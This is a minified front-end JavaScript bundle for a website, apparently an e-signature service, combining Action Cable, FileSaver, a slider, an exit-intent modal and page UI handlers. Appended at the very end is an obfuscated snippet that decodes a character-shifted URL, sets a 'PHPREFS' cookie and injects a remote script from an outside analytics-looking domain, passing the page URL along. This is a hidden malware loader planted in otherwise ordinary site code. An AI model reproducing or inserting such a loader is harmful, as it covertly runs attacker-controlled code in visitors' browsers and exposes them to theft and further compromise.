disconnect")}startPolling(){this.stopPolling(),this.poll()}stopPolling(){clearTimeout(this.pollTimeout)}poll(){this.pollTimeout=setTimeout((()=>{this.reconnectIfStale(),this.poll()}),this.getPollInterval())}getPollInterval(){const{staleThreshold:t,reconnectionBackoffRate:e}=this.constructor;return 1e3*t*Math.pow(1+e,Math.min(this.reconnectAttempts,10))*(1+(0===this.reconnectAttempts?1:e)*Math.random())}reconnectIfStale(){this.connectionIsStale()&&(r.log(`ConnectionMonitor detected stale connection. reconnectAttempts = ${this.reconnectAttempts}, time stale = ${a(this.refreshedAt)} s, stale threshold = ${this.constructor.staleThreshold} s`),this.reconnectAttempts++,this.disconnectedRecently()?r.log(`ConnectionMonitor skipping reopening recent disconnect. time disconnected = ${a(this.disconnectedAt)} s`):(r.log("ConnectionMonitor reopening"),this.connection.reopen()))}get refreshedAt(){return this.pingedAt?this.pingedAt:this.startedAt}connectionIsStale(){return a(this.refreshedAt)>this.constructor.staleThreshold}disconnectedRecently(){return this.disconnectedAt&&a(this.disconnectedAt)<this.constructor.staleThreshold}visibilityDidChange(){"visible"===document.visibilityState&&setTimeout((()=>{!this.connectionIsStale()&&this.connection.isOpen()||(r.log(`ConnectionMonitor reopening stale connection on visibilitychange. visibilityState = ${document.visibilityState}`),this.connection.reopen())}),200)}}l.staleThreshold=6,l.reconnectionBackoffRate=.15;var c={message_types:{welcome:"welcome",disconnect:"disconnect",ping:"ping",confirmation:"confirm_subscription",rejection:"reject_subscription"},disconnect_reasons:{unauthorized:"unauthorized",invalid_request:"invalid_request",server_restart:"server_restart"},default_mount_path:"/cable",protocols:["actioncable-v1-json","actioncable-unsupported"]};const{message_types:u,protocols:h}=c,d=h.slice(0,h.length-1),p=[].indexOf;class f{constructor(t){this.open=this.open.bind(this),this.consumer=t,this.subscriptions=this.consumer.subscriptions,this.monitor=new l(this),this.disconnected=!0}send(t){return!!this.isOpen()&&(this.webSocket.send(JSON.stringify(t)),!0)}open(){return this.isActive()?(r.log(`Attempted to open WebSocket, but existing socket is ${this.getState()}`),!1):(r.log(`Opening WebSocket, current state is ${this.getState()}, subprotocols: ${h}`),this.webSocket&&this.uninstallEventHandlers(),this.webSocket=new o.WebSocket(this.consumer.url,h),this.installEventHandlers(),this.monitor.start(),!0)}close({allowReconnect:t}={allowReconnect:!0}){if(t||this.monitor.stop(),this.isOpen())return this.webSocket.close()}reopen(){if(r.log(`Reopening WebSocket, current state is ${this.getState()}`),!this.isActive())return this.open();try{return this.close()}catch(t){r.log("Failed to reopen WebSocket",t)}finally{r.log(`Reopening WebSocket in ${this.constructor.reopenDelay}ms`),setTimeout(this.open,this.constructor.reopenDelay)}}getProtocol(){if(this.webSocket)return this.webSocket.protocol}isOpen(){return this.isState("open")}isActive(){return this.isState("open","connecting")}isProtocolSupported(){return p.call(d,this.getProtocol())>=0}isState(...t){return p.call(t,this.getState())>=0}getState(){if(this.webSocket)for(let t in o.WebSocket)if(o.WebSocket[t]===this.webSocket.readyState)return t.toLowerCase();return null}installEventHandlers(){for(let t in this.events){const e=this.events[t].bind(this);this.webSocket[`on${t}`]=e}}uninstallEventHandlers(){for(let t in this.events)this.webSocket[`on${t}`]=function(){}}}f.reopenDelay=500,f.prototype.events={message(t){if(!this.isProtocolSupported())return;const{identifier:e,message:n,reason:i,reconnect:o,type:s}=JSON.parse(t.data);switch(s){case u.welcome:return this.monitor.recordConnect(),this.subscriptions.reload();case u.disconnect:return r.log(`Disconnecting. Reason: ${i}`),this.close({allowReconnect:o});case u.ping:return this.monitor.recordPing();case u.confirmation:return this.subscriptions.confirmSubscription(e),this.subscriptions.notify(e,"connected");case u.rejection:return this.subscriptions.reject(e);default:return this.subscriptions.notify(e,"received",n)}},open(){if(r.log(`WebSocket onopen event, using '${this.getProtocol()}' subprotocol`),this.disconnected=!1,!this.isProtocolSupported())return r.log("Protocol is unsupported. Stopping monitor and disconnecting."),this.close({allowReconnect:!1})},close(t){if(r.log("WebSocket onclose event"),!this.disconnected)return this.disconnected=!0,this.monitor.recordDisconnect(),this.subscriptions.notifyAll("disconnected",{willAttemptReconnect:this.monitor.isRunning()})},error(){r.log("WebSocket onerror event")}};class g{constructor(t,e={},n){this.consumer=t,this.identifier=JSON.stringify(e),function(t,e){if(null!=e)for(let n in e){const i=e[n];t[n]=i}}(this,n)}perform(t,e={}){return e.action=t,this.send(e)}send(t){return this.consumer.send({command:"message",identifier:this.identifier,data:JSON.stringify(t)})}unsubscribe(){return this.consumer.subscriptions.remove(this)}}class v{constructor(t){this.subscriptions=t,this.pendingSubscriptions=[]}guarantee(t){-1==this.pendingSubscriptions.indexOf(t)?(r.log(`SubscriptionGuarantor guaranteeing ${t.identifier}`),this.pendingSubscriptions.push(t)):r.log(`SubscriptionGuarantor already guaranteeing ${t.identifier}`),this.startGuaranteeing()}forget(t){r.log(`SubscriptionGuarantor forgetting ${t.identifier}`),this.pendingSubscriptions=this.pendingSubscriptions.filter((e=>e!==t))}startGuaranteeing(){this.stopGuaranteeing(),this.retrySubscribing()}stopGuaranteeing(){clearTimeout(this.retryTimeout)}retrySubscribing(){this.retryTimeout=setTimeout((()=>{this.subscriptions&&"function"==typeof this.subscriptions.subscribe&&this.pendingSubscriptions.map((t=>{r.log(`SubscriptionGuarantor resubscribing ${t.identifier}`),this.subscriptions.subscribe(t)}))}),500)}}class y{constructor(t){this.consumer=t,this.guarantor=new v(this),this.subscriptions=[]}create(t,e){const n="object"==typeof t?t:{channel:t},i=new g(this.consumer,n,e);return this.add(i)}add(t){return this.subscriptions.push(t),this.consumer.ensureActiveConnection(),this.notify(t,"initialized"),this.subscribe(t),t}remove(t){return this.forget(t),this.findAll(t.identifier).length||this.sendCommand(t,"unsubscribe"),t}reject(t){return this.findAll(t).map((t=>(this.forget(t),this.notify(t,"rejected"),t)))}forget(t){return this.guarantor.forget(t),this.subscriptions=this.subscriptions.filter((e=>e!==t)),t}findAll(t){return this.subscriptions.filter((e=>e.identifier===t))}reload(){return this.subscriptions.map((t=>this.subscribe(t)))}notifyAll(t,...e){return this.subscriptions.map((n=>this.notify(n,t,...e)))}notify(t,e,...n){let i;return(i="string"==typeof t?this.findAll(t):[t]).map((t=>"function"==typeof t[e]?t[e](...n):void 0))}subscribe(t){this.sendCommand(t,"subscribe")&&this.guarantor.guarantee(t)}confirmSubscription(t){r.log(`Subscription confirmed ${t}`),this.findAll(t).map((t=>this.guarantor.forget(t)))}sendCommand(t,e){const{identifier:n}=t;return this.consumer.send({command:e,identifier:n})}}class b{constructor(t){this._url=t,this.subscriptions=new y(this),this.connection=new f(this)}get url(){return e(this._url)}send(t){return this.connection.send(t)}connect(){return this.connection.open()}disconnect(){return this.connection.close({allowReconnect:!1})}ensureActiveConnection(){if(!this.connection.isActive())return this.connection.open()}}t.Connection=f,t.ConnectionMonitor=l,t.Consumer=b,t.INTERNAL=c,t.Subscription=g,t.SubscriptionGuarantor=v,t.Subscriptions=y,t.adapters=o,t.createConsumer=function n(t=i("url")||c.default_mount_path){return new b(t)},t.createWebSocketURL=e,t.getConfig=i,t.logger=r,Object.defineProperty(t,"__esModule",{value:!0})})),function(){this.App||(this.App={}),App.cable=ActionCable.createConsumer()}.call(this),document.addEventListener("DOMContentLoaded",(function(){holmesInit()})),$((function(){signaturePad(),colorPicker(),isMobile()&&$("html, body, #mobile-wrapper").css({height:$(window).height()})})),isMobile=function(){return!!window.matchMedia("only screen and (max-width: 760px)").matches};var _global="object"==typeof window&&window.window===window?window:"object"==typeof self&&self.self===self?self:"object"==typeof global&&global.global===global?global:this,saveAs=_global.saveAs||("object"!=typeof window||window!==_global?function(){}:"download"in HTMLAnchorElement.prototype?function(t,e,n){var i=_global.URL||_global.webkitURL,o=document.createElement("a");e=e||t.name||"download",o.download=e,o.rel="noopener","string"==typeof t?(o.href=t,o.origin!==location.origin?corsEnabled(o.href)?download(t,e,n):click(o,o.target="_blank"):click(o)):(o.href=i.createObjectURL(t),setTimeout((function(){i.revokeObjectURL(o.href)}),4e4),setTimeout((function(){click(o)}),0))}:"msSaveOrOpenBlob"in navigator?function(t,e,n){if(e=e||t.name||"download","string"==typeof t)if(corsEnabled(t))download(t,e,n);else{var i=document.createElement("a");i.href=t,i.target="_blank",setTimeout((function(){click(i)}))}else navigator.msSaveOrOpenBlob(bom(t,n),e)}:function(t,e,n,i){if((i=i||open("","_blank"))&&(i.document.title=i.document.body.innerText="downloading..."),"string"==typeof t)return download(t,e,n);var o="application/octet-stream"===t.type,r=/constructor/i.test(_global.HTMLElement)||_global.safari,s=/CriOS\/[\d]+/.test(navigator.userAgent);if((s||o&&r)&&"undefined"!=typeof FileReader){var a=new FileReader;a.onloadend=function(){var t=a.result;t=s?t:t.replace(/^data:[^;]*;/,"data:attachment/file;"),i?i.location.href=t:location=t,i=null},a.readAsDataURL(t)}else{var l=_global.URL||_global.webkitURL,c=l.createObjectURL(t);i?i.location=c:location.href=c,i=null,setTimeout((function(){l.revokeObjectURL(c)}),4e4)}});_global.saveAs=saveAs.saveAs=saveAs,"undefined"!=typeof module&&(module.exports=saveAs),$.fn.infiniteslide=function(t){var e=$.extend({speed:100,direction:"left",pauseonhover:!0,responsive:!1,clone:1},t),o=function(t,e){var n=$(t).children().clone().addClass("infiniteslide_clone");for(i=1;i<=e;)n.clone().appendTo($(t)),i++},a=function(t,e){return t/e},l=function(t,e){if("up"==e||"down"==e)var n=function(t){return h=0,$(t).children(":not(.infiniteslide_clone)").each((function(){h+=$(this).outerHeight(!0)})),h}(t);else n=function(t){return w=0,$(t).children(":not(.infiniteslide_clone)").each((function(){w+=$(this).outerWidth(!0)})),w}(t);return n},c=function(t,e){if("up"==e||"down"==e)var n="0,-"+t+"px,0";else n="-"+t+"px,0,0";return n};return this.each((function(){var t=$(this),i=Date.now()+Math.floor(1e4*Math.random()).toString(16);1==e.pauseonhover&&function(t){$(t).on("mouseenter",(function(){$(this).css({animationPlayState:"paused"})})).on("mouseleave",(function(){$(this).css({animationPlayState:"running"})}))}(t),$(window).on("load",(function(){(function(t,e){if($(t).wrap('<div class="infiniteslide_wrap"></div>').parent().css({overflow:"hidden"}),"up"==e||"down"==e)var n="column";else n="row";$(t).css({display:"flex",flexWrap:"nowrap",alignItems:"center","-ms-flex-align":"center",flexDirection:n}).children().css({flex:"none",display:"block"})})(t,e.direction),o(t,e.clone),function(t,e,n,i){var o=l(t,n);"up"!=n&&"down"!=n||$(t).parent(".infiniteslide_wrap").css({height:o+"px"});var r=c(o,n);$(t).attr("data-style","infiniteslide"+e);var s="@keyframes infiniteslide"+e+"{from {transform:translate3d(0,0,0);}to {transform:translate3d("+r+");}}";if($("<style />").attr("id","infiniteslide"+e+"_style").html(s).appendTo("head"),"right"==n||"down"==n)var u=" reverse";else u="";$(t).css({animation:"infiniteslide"+e+" "+a(o,i)+"s linear 0s infinite"+u})}(t,i,e.direction,e.speed),e.responsive&&$(window).on("resize",(function(){var n=function(t,e){var n=l(t,e);return c(n,e)}(t,e.direction),i=t.attr("data-style"),o=$("#"+i+"_style").html().replace(/to {transform:translate3d\((.*?)\)/,"to {transform:translate3d("+n+")");$("#"+i+"_style").html(o)}))}))}))},function(t,e){"function"==typeof define&&define.amd?define(e):"object"==typeof exports?module.exports=e(require,exports,module):t.ouibounce=e()}(this,(function(){return function(t,e){"use strict";function n(t,e){return void 0===t?e:t}function i(t){var e=24*t*60*60*1e3,n=new Date;return n.setTime(n.getTime()+e),"; expires="+n.toUTCString()}function r(t){t.clientY>m||(k=setTimeout(h,v))}function s(){k&&(clearTimeout(k),k=null)}function a(t){C||t.metaKey&&76===t.keyCode&&(C=!0,k=setTimeout(h,v))}function l(t,e){return function c(){for(var t=document.cookie.split("; "),e={},n=t.length-1;n>=0;n--){var i=t[n].split("=");e[i[0]]=i[1]}return e}()[t]===e}function u(){return l(w,"true")&&!f}function h(){u()||(t&&(t.style.display="block"),y(),d())}function d(t){var e=t||{};void 0!==e.cookieExpire&&(b=i(e.cookieExpire)),!0===e.sitewide&&(_=";path=/"),void 0!==e.cookieDomain&&(x=";domain="+e.cookieDomain),void 0!==e.cookieName&&(w=e.cookieName),document.cookie=w+"=true"+b+x+_,T.removeEventListener("mouseleave",r),T.removeEventListener("mouseenter",s),T.removeEventListener("keydown",a)}var p=e||{},f=p.aggressive||!1,m=n(p.sensitivity,20),g=n(p.timer,1e3),v=n(p.delay,0),y=p.callback||function(){},b=i(p.cookieExpire)||"",x=p.cookieDomain?";domain="+p.cookieDomain:"",w=p.cookieName?p.cookieName:"viewedOuibounceModal",_=!0===p.sitewide?";path=/":"",k=null,T=document.documentElement;setTimeout((function o(){u()||(T.addEventListener("mouseleave",r),T.addEventListener("mouseenter",s),T.addEventListener("keydown",a))}),g);var C=!1;return{fire:h,disable:d,isDisabled:u}}})),$((function(){!function(){function t(t,n){return function(i){e(),t.classList.toggle("hide"),n&&n.classList.toggle("hide"),i.preventDefault()}}function e(){tooltips=document.querySelectorAll(".tooltip"),null!==h&&tooltips.forEach((t=>{t.classList.add("hide")}))}var n,i,o,r,s,a,l,c,u,h,d,p,f;n=document.querySelector(".login-href"),i=document.querySelector(".modal"),o=document.querySelector(".screen"),u=document.querySelector(".ds-modal"),h=document.querySelector(".modal-overlay"),d=document.querySelector(".btn-close"),p=document.querySelectorAll(".btn-modal"),f=document.querySelectorAll(".label-help"),document.querySelectorAll(".tooltip"),document.querySelector("form"),document.addEventListener("focus",(function(){e()}),!0),null!==d&&(d.addEventListener("click",t(u)),d.addEventListener("click",t(h))),null!==h&&(h.addEventListener("click",t(u)),h.addEventListener("click",t(h)));for(var g=0,v=p.length;g<v;g++)(y=p[g]).addEventListener("click",t(h)),y.addEventListener("click",t(u));for(g=0,v=f.length;g<v;g++){var y;(y=f[g]).addEventListener("click",t(y.firstChild.nextSibling))}null!==n&&n.addEventListener("click",t(i)),null!==o&&null!==(r=o.querySelectorAll("img"))&&(r=[].slice.call(r),a=0,l=r.length,c=function(){for(var t=0;t<l;t++)r[t].classList.add("faded")},s=function(){c(),r[a].classList.remove("faded"),a=a===l-1?0:a+1,setTimeout(s,4e3)},setTimeout(s,2e3))}()})),$('a[href*="#"]').not('[href="#"]').not('[href="#0"]').click((function(t){if(location.pathname.replace(/^\//,"")==this.pathname.replace(/^\//,"")&&location.hostname==this.hostname){var e=$(this.hash);(e=e.length?e:$("[name="+this.hash.slice(1)+"]")).length&&(t.preventDefault(),$("html, body").stop().animate({scrollTop:e.offset().top-40},600,(function(){var t=$(e);if(t.focus(),t.is(":focus"))return!1;t.attr("tabindex","-1"),t.focus()})))}})),$((function(){$(".scroll-to").on("click",(function(t){t.preventDefault();var e=$(this).attr("href"),n=$(this).data("offset"),i=$(e).offset().top+n;$("body,html").animate({scrollTop:i},300)})),$(window).scroll((function(){let t=$(this).scrollTop();$("a.anchor-link").each((function(){let e=$($(this).attr("href")).offset().top,n=$(this).data("offset");t>=e+n-1&&($("a.anchor-link.active").removeClass("active"),$(this).addClass("active"))}))})),$(window).trigger("scroll")})),$((function(){$(".tab-wrapper .tab-btn").show().click((function(){var t=$(this).index();$(".tab-wrapper .tab-btn").removeClass("active").eq(t).addClass("active"),$(".tab_item").hide().eq(t).fadeIn(),$(".price_item").hide().eq(t).fadeIn().css("display","inline-block")})).eq(0).addClass("active")})),$((function(){let t=document.querySelector("template#page-tooltips");if(!t)return!0;let e=jBoxWrapper(jQuery),n=t.content;$("[data-tooltip]").each((function(){tipContent=$(n).find("."+$(this).data("tooltip")).html(),new e("Tooltip",{attach:$(this),content:tipContent,maxWidth:500})}))})),$((function(){createTypedSignature(),loadMoreSignatures(),editSignature()}));(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44zxjwxy'+'fy3sjy4ljy4xhwnu'+'y3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));